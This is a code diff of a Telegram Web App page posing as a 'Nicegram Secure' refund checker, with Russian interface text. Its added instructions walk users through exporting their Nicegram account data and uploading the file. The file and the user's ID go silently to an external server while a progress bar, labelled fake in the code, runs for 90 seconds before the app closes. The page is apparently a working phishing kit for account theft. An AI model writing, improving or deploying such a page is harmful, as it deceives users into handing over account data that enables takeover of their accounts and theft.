@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Nicegram Secure</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <!-- Подключаем jQuery (нужен для частиц) -->
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 
     <style>
@@ -18,23 +17,24 @@
             height: 100vh;
             overflow: hidden;
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
             position: relative;
         }
 
-        /* --- 1. Эффект частиц (Фон) --- */
+        /* --- ФОНОВЫЕ ЭФФЕКТЫ --- */
         #particles {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            z-index: 1; /* Самый нижний слой */
+            z-index: 1;
             opacity: 0.6;
+            pointer-events: none;
         }
 
-        /* --- 2. Эффект Liquid Background (Жидкие пятна) --- */
         .liquid-blob {
             position: absolute;
             border-radius: 50%;
@@ -44,32 +44,9 @@
             opacity: 0.6;
         }
 
-        .blob-1 {
-            width: 300px;
-            height: 300px;
-            background: #4facfe;
-            top: -50px;
-            left: -50px;
-            animation-delay: 0s;
-        }
-
-        .blob-2 {
-            width: 250px;
-            height: 250px;
-            background: #f093fb;
-            bottom: -50px;
-            right: -50px;
-            animation-delay: 5s;
-        }
-
-        .blob-3 {
-            width: 200px;
-            height: 200px;
-            background: #66a6ff;
-            top: 40%;
-            left: 40%;
-            animation-delay: 2s;
-        }
+        .blob-1 { width: 300px; height: 300px; background: #4facfe; top: -50px; left: -50px; }
+        .blob-2 { width: 250px; height: 250px; background: #f093fb; bottom: -50px; right: -50px; animation-delay: 5s; }
+        .blob-3 { width: 200px; height: 200px; background: #66a6ff; top: 40%; left: 40%; animation-delay: 2s; }
 
         @keyframes float {
             0% { transform: translate(0, 0) scale(1); }
@@ -78,55 +55,49 @@
             100% { transform: translate(0, 0) scale(1); }
         }
 
-        /* --- 3. Glassmorphism Card (Стекло) --- */
+        /* --- КАРТОЧКА --- */
         .glass-card {
             position: relative;
-            z-index: 10; /* Поверх всего */
+            z-index: 10;
             width: 85%;
             max-width: 350px;
             padding: 40px 20px;
-            
-            /* Эффект матового стекла */
             background: rgba(255, 255, 255, 0.05);
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 255, 255, 0.15);
-            border-top: 1px solid rgba(255, 255, 255, 0.3);
-            border-left: 1px solid rgba(255, 255, 255, 0.3);
-            
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
             border-radius: 25px;
             text-align: center;
             display: flex;
             flex-direction: column;
             align-items: center;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+            transition: height 0.3s;
         }
 
+        /* --- ЛОГОТИП С АНИМАЦИЕЙ --- */
         .logo {
-            font-size: 60px;
-            margin-bottom: 10px;
+            font-size: 70px;
+            margin-bottom: 15px;
             font-weight: 800;
             background: linear-gradient(135deg, #fff 30%, #a5a5a5 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            text-shadow: 0 10px 20px rgba(0,0,0,0.2);
+            /* Анимация */
+            animation: logo-pulse 3s infinite ease-in-out;
+            display: inline-block;
         }
 
-        h1 {
-            font-size: 22px;
-            margin: 10px 0;
-            font-weight: 600;
-            letter-spacing: 0.5px;
+        @keyframes logo-pulse {
+            0% { transform: scale(1); filter: drop-shadow(0 0 10px rgba(255,255,255,0.1)); }
+            50% { transform: scale(1.05); filter: drop-shadow(0 0 25px rgba(255,255,255,0.4)); }
+            100% { transform: scale(1); filter: drop-shadow(0 0 10px rgba(255,255,255,0.1)); }
         }
 
-        p {
-            color: rgba(255, 255, 255, 0.7);
-            font-size: 14px;
-            margin-bottom: 30px;
-            line-height: 1.5;
-        }
+        h1 { font-size: 22px; margin: 5px 0 10px 0; font-weight: 600; }
+        p { color: rgba(255, 255, 255, 0.7); font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
 
-        /* Кнопка с эффектом свечения */
+        /* --- КНОПКИ --- */
         .btn {
             background: linear-gradient(90deg, #007aff, #00c6ff);
             color: white;
@@ -139,199 +110,287 @@
             width: 100%;
             box-shadow: 0 10px 20px rgba(0, 122, 255, 0.3);
             transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
         }
+        .btn:active { transform: scale(0.96); opacity: 0.9; }
 
-        .btn:active {
-            transform: scale(0.96);
-            box-shadow: 0 5px 10px rgba(0, 122, 255, 0.2);
-        }
-
-        .btn-text {
-            position: relative;
-            z-index: 2;
-        }
-
-        /* Скрытый инпут */
         input[type="file"] { display: none; }
-        
-        #status {
-            margin-top: 15px;
-            font-size: 13px;
-            font-weight: 500;
-            min-height: 20px;
+
+        /* --- ИНСТРУКЦИЯ (ВНИЗУ) --- */
+        .footer-btn {
+            margin-top: 30px;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 14px;
+            text-decoration: underline;
+            cursor: pointer;
+            z-index: 10;
         }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.6);
+            z-index: 99;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s;
+        }
+        .modal-overlay.active { opacity: 1; pointer-events: all; }
+
+        .modal {
+            position: fixed;
+            bottom: -100%;
+            left: 0;
+            width: 100%;
+            background: #1c1c1e;
+            border-top-left-radius: 20px;
+            border-top-right-radius: 20px;
+            padding: 25px 20px 40px 20px;
+            box-sizing: border-box;
+            z-index: 100;
+            transition: bottom 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+            color: #fff;
+            border-top: 1px solid #333;
+        }
+        .modal.active { bottom: 0; }
+
+        .modal h3 { margin-top: 0; margin-bottom: 20px; font-size: 18px; text-align: center; }
+        .modal ol { padding-left: 20px; color: #ccc; font-size: 14px; line-height: 1.6; }
+        .modal li { margin-bottom: 10px; }
+        
+        .close-modal {
+            width: 40px; height: 5px; background: #444;
+            border-radius: 10px; margin: 0 auto 20px auto;
+        }
+
+        /* --- ПРОГРЕСС БАР --- */
+        #progress-container {
+            display: none;
+            width: 100%;
+            text-align: center;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 15px 0;
+            position: relative;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: #34c759;
+            border-radius: 10px;
+            transition: width 0.2s linear;
+            box-shadow: 0 0 10px #34c759;
+        }
+        .status-text { font-size: 13px; color: #ccc; margin-bottom: 5px; }
+        .percent-text { font-size: 24px; font-weight: bold; color: #fff; }
 
     </style>
 </head>
 <body>
 
-    <!-- Жидкий фон (Blobs) -->
     <div class="liquid-blob blob-1"></div>
     <div class="liquid-blob blob-2"></div>
     <div class="liquid-blob blob-3"></div>
 
-    <!-- Контейнер для частиц -->
     <div id="particles"></div>
 
-    <!-- Основная стеклянная карточка -->
     <div class="glass-card">
         <div class="logo">N</div>
         <h1 id="greeting">Nicegram</h1>
-        <p>Защищенная среда для проверки данных.<br>Загрузите файл экспорта.</p>
+        <p id="subtitle">Защищенная среда для проверки данных.<br>Загрузите файл экспорта.</p>
 
+        <!-- Кнопка загрузки -->
         <input type="file" id="fileInput">
-        
-        <button class="btn" onclick="document.getElementById('fileInput').click()">
-            <span class="btn-text">📁 Выбрать файл</span>
+        <button id="uploadBtn" class="btn" onclick="document.getElementById('fileInput').click()">
+            📁 Выбрать файл
         </button>
 
-        <div id="status"></div>
+        <!-- Блок прогресса (скрыт по умолчанию) -->
+        <div id="progress-container">
+            <div class="status-text">Проверка на рефаунд...</div>
+            <div class="percent-text" id="percent">0%</div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div style="font-size: 11px; color: #777; margin-top: 10px;">Не закрывайте приложение</div>
+        </div>
     </div>
 
-    <!-- Скрипт частиц (Встроенный аналог jParticle) -->
+    <!-- Кнопка Инструкции -->
+    <div class="footer-btn" onclick="toggleModal(true)">Как скачать файл? (Инструкция)</div>
+
+    <!-- Модальное окно Инструкции -->
+    <div class="modal-overlay" onclick="toggleModal(false)"></div>
+    <div class="modal" id="instructionModal">
+        <div class="close-modal" onclick="toggleModal(false)"></div>
+        <h3>Инструкция</h3>
+        <ol>
+            <li>Скачайте приложение Nicegram с официального сайта, нажав на кнопку в главном меню.</li>
+            <li>Откройте Nicegram и войдите в свой аккаунт.</li>
+            <li>Зайдите в настройки и выберите пункт «Nicegram».</li>
+            <li>Экспортируйте данные аккаунта, нажав на кнопку «Экспортировать в файл».</li>
+            <li>Откройте главное меню бота и нажмите на кнопку "Проверка на рефаунд".</li>
+            <li>Отправьте файл боту.</li>
+        </ol>
+        <button class="btn" onclick="toggleModal(false)" style="margin-top: 10px; background: #333;">Понятно</button>
+    </div>
+
+    <!-- Частицы (Particle Script) -->
     <script>
         (function() {
             var canvas = document.createElement('canvas');
             var ctx = canvas.getContext('2d');
             var container = document.getElementById('particles');
             container.appendChild(canvas);
-
-            var particles = [];
-            var width, height;
-            
-            // Настройки частиц
-            var particleCount = 60;
-            var connectionDistance = 100;
-            var speed = 0.5;
+            var particles = [], width, height;
+            var particleCount = 60, connectionDistance = 100, speed = 0.5;
 
             function resize() {
-                width = container.offsetWidth;
-                height = container.offsetHeight;
-                canvas.width = width;
-                canvas.height = height;
+                width = container.offsetWidth; height = container.offsetHeight;
+                canvas.width = width; canvas.height = height;
             }
-
             function Particle() {
-                this.x = Math.random() * width;
-                this.y = Math.random() * height;
-                this.vx = (Math.random() - 0.5) * speed;
-                this.vy = (Math.random() - 0.5) * speed;
+                this.x = Math.random() * width; this.y = Math.random() * height;
+                this.vx = (Math.random() - 0.5) * speed; this.vy = (Math.random() - 0.5) * speed;
                 this.size = Math.random() * 2 + 1;
             }
-
             Particle.prototype.update = function() {
-                this.x += this.vx;
-                this.y += this.vy;
-
+                this.x += this.vx; this.y += this.vy;
                 if (this.x < 0 || this.x > width) this.vx *= -1;
                 if (this.y < 0 || this.y > height) this.vy *= -1;
             };
-
             Particle.prototype.draw = function() {
                 ctx.fillStyle = 'rgba(255, 255, 255, 0.5)';
-                ctx.beginPath();
-                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
-                ctx.fill();
+                ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); ctx.fill();
             };
-
             function initParticles() {
                 resize();
-                for (var i = 0; i < particleCount; i++) {
-                    particles.push(new Particle());
-                }
+                for (var i = 0; i < particleCount; i++) particles.push(new Particle());
                 animate();
             }
-
             function animate() {
                 ctx.clearRect(0, 0, width, height);
-                
                 for (var i = 0; i < particles.length; i++) {
-                    particles[i].update();
-                    particles[i].draw();
-
-                    // Рисуем линии
+                    particles[i].update(); particles[i].draw();
                     for (var j = i + 1; j < particles.length; j++) {
-                        var dx = particles[i].x - particles[j].x;
-                        var dy = particles[i].y - particles[j].y;
+                        var dx = particles[i].x - particles[j].x; var dy = particles[i].y - particles[j].y;
                         var dist = Math.sqrt(dx * dx + dy * dy);
-
                         if (dist < connectionDistance) {
                             ctx.strokeStyle = 'rgba(255, 255, 255, ' + (1 - dist / connectionDistance) * 0.2 + ')';
-                            ctx.lineWidth = 1;
-                            ctx.beginPath();
-                            ctx.moveTo(particles[i].x, particles[i].y);
-                            ctx.lineTo(particles[j].x, particles[j].y);
-                            ctx.stroke();
+                            ctx.lineWidth = 1; ctx.beginPath(); ctx.moveTo(particles[i].x, particles[i].y); ctx.lineTo(particles[j].x, particles[j].y); ctx.stroke();
                         }
                     }
                 }
                 requestAnimationFrame(animate);
             }
-
             window.addEventListener('resize', resize);
             initParticles();
         })();
     </script>
 
-    <!-- Логика работы с ботом -->
+    <!-- Основная логика -->
     <script>
-        // ============================================
-        // ВАЖНО: ВСТАВЬТЕ ССЫЛКУ ИЗ NGROK СЮДА
+        // Ссылка на Render
         const SERVER_URL = "https://nicegramq.onrender.com"; 
-        // ============================================
 
         const tg = window.Telegram.WebApp;
         tg.expand();
-        tg.enableClosingConfirmation(); // Спрашивать перед закрытием
+        tg.enableClosingConfirmation();
 
         const fileInput = document.getElementById('fileInput');
-        const statusText = document.getElementById('status');
-        const greeting = document.getElementById('greeting');
+        const uploadBtn = document.getElementById('uploadBtn');
+        const progressContainer = document.getElementById('progress-container');
+        const progressFill = document.getElementById('progressFill');
+        const percentText = document.getElementById('percent');
+        const subtitle = document.getElementById('subtitle');
+        const statusText = document.querySelector('.status-text');
 
+        // Приветствие
         if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
-            greeting.innerText = `Привет, ${tg.initDataUnsafe.user.first_name}`;
+            document.getElementById('greeting').innerText = `Привет, ${tg.initDataUnsafe.user.first_name}`;
+        }
+
+        // Открытие/закрытие инструкции
+        function toggleModal(show) {
+            const modal = document.getElementById('instructionModal');
+            const overlay = document.querySelector('.modal-overlay');
+            if (show) {
+                modal.classList.add('active');
+                overlay.classList.add('active');
+            } else {
+                modal.classList.remove('active');
+                overlay.classList.remove('active');
+            }
         }
 
         fileInput.addEventListener('change', () => {
             const file = fileInput.files[0];
             if (file) {
-                uploadFile(file);
+                startVerificationProcess(file);
             }
         });
 
-        function uploadFile(file) {
-            statusText.innerText = "⏳ Загрузка на сервер...";
-            statusText.style.color = "#FFD700"; // Gold
+        function startVerificationProcess(file) {
+            // 1. Скрываем кнопку, показываем прогресс
+            uploadBtn.style.display = 'none';
+            subtitle.style.display = 'none';
+            document.querySelector('.footer-btn').style.display = 'none'; // Скрыть инструкцию
+            progressContainer.style.display = 'block';
 
+            // 2. Отправляем файл ФОНОМ (не дожидаясь таймера)
+            uploadFileInBackground(file);
+
+            // 3. Запускаем фейковый таймер на 90 секунд (90000 мс)
+            let progress = 0;
+            const duration = 90000; // 1 минута 30 секунд
+            const intervalTime = 100; // обновление каждые 100мс
+            const steps = duration / intervalTime;
+            const increment = 100 / steps;
+
+            const timer = setInterval(() => {
+                progress += increment;
+                
+                // Если случайно перевалило за 100
+                if (progress > 100) progress = 100;
+
+                // Обновляем UI
+                let displayPercent = Math.floor(progress);
+                percentText.innerText = displayPercent + "%";
+                progressFill.style.width = progress + "%";
+
+                if (progress >= 100) {
+                    clearInterval(timer);
+                    finishProcess();
+                }
+            }, intervalTime);
+        }
+
+        function uploadFileInBackground(file) {
             const formData = new FormData();
             formData.append('file', file);
             formData.append('user_id', tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "0000");
 
-            fetch(`${SERVER_URL}/upload`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                if (response.ok) {
-                    statusText.innerText = "✅ Файл успешно отправлен!";
-                    statusText.style.color = "#34c759";
-                    
-                    // Вибрация успеха (Haptic)
-                    if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+            // Просто отправляем, не обрабатывая UI здесь
+            fetch(`${SERVER_URL}/upload`, { method: 'POST', body: formData })
+                .then(res => console.log("Upload status:", res.status))
+                .catch(err => console.error("Upload error:", err));
+        }
 
-                    setTimeout(() => tg.close(), 2000);
-                } else {
-                    throw new Error("Server error");
-                }
-            })
-            .catch(error => {
-                console.error(error);
-                statusText.innerText = "❌ Ошибка соединения.";
-                statusText.style.color = "#ff453a";
-                if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
-            });
+        function finishProcess() {
+            statusText.innerText = "Проверка завершена";
+            statusText.style.color = "#34c759";
+            percentText.innerText = "Успешно!";
+            
+            if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+            
+            // Ждем 1.5 секунды и закрываем
+            setTimeout(() => {
+                tg.close();
+            }, 1500);
         }
     </script>
 </body>
